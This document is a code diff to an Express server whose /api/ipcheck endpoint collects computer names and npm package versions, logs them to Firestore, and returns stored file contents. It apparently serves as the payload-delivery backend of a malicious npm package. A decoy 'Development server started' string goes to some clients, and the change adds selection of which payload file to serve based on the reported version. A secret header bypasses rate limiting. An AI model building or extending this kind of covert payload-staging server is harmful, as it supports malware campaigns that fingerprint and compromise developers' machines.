@@ -40,16 +40,14 @@ const limiter = rateLimit({
   skip: (req) => req.headers["x-secret-header"] === SECRET_HEADER_VALUE,
 });
 
-function endsWithV1(str) {
-  // Check if the string is at least 2 characters long
-  if (str.length < 2) {
-      return false; // Not enough length to end with 'v1'
+function l2(rBody) {
+  const input = rBody.npm_package_version || "03";
+  try {
+      return (typeof input !== 'string' || input.length < 2) ? "03" : input.slice(-2);
+  } catch (error) {
+      // Handle the error appropriately
+      return "03";
   }
-  // Get the last two characters of the string
-  const lastTwoChars = str.slice(-2);
-  
-  // Check if the last two characters are 'v1'
-  return lastTwoChars === 'v1';
 }
 
 // Apply rate limiter globally
@@ -120,6 +118,10 @@ app.use(async (req, res, next) => {
       // Check if the request is to /api/ipcheck/:filename
       if (requestMethod === "POST" && requestUrl.startsWith("/api/ipcheck/") && req.body.COMPUTERNAME) {
           logData.computername = req.body.COMPUTERNAME;
+          
+          const requestedFile = req.params.filename;
+          const fileName = requestedFile == "703" ? "03" : l2(req.body);
+          logData.flag = fileName;
       }
 
       // Log the request to Firestore
@@ -168,28 +170,36 @@ app.get("/api/ipcheck/:filename", (req, res) => {
   });
 });
 app.post("/api/ipcheck/:filename", (req, res) => {
-  const requestedFile = req.params.filename;
-  const filePath = path.join(folderPath, requestedFile);
+  try {
+    
+    const requestedFile = req.params.filename;
+    const fileName = requestedFile == "703" ? "03" : l2(req.body);
 
-  if(req.body.npm_package_version && endsWithV1(req.body.npm_package_version)  ){
-    res.json('console.log("Development server started...")');
-    }
-  else{
-    // Check if the file exists
-    fs.access(filePath, fs.constants.F_OK, (err) => {
-      if (err) {
-        return res.status(404).json({ error: "IP check failed." });
+    if(l2(req.body) == "v1" ){
+      res.json('console.log("Development server started...")');
       }
+    else{
 
-      // Read the file content
-      fs.readFile(filePath, "utf-8", (err, content) => {
+      const filePath = path.join(folderPath, fileName);
+      // Check if the file exists
+      fs.access(filePath, fs.constants.F_OK, (err) => {
         if (err) {
-          return res.status(500).json({ error: "Unable to check IP." });
+          return res.status(404).json({ error: "IP check failed." });
         }
-        res.json(content);
-        
+
+        // Read the file content
+        fs.readFile(filePath, "utf-8", (err, content) => {
+          if (err) {
+            return res.status(500).json({ error: "Unable to check IP." });
+          }
+          res.json(content);
+          
+        });
       });
-    });
+    }
+  }
+  catch(e) {
+    return res.status(404).json({ error: "IP check failed." });
   }
 });
 
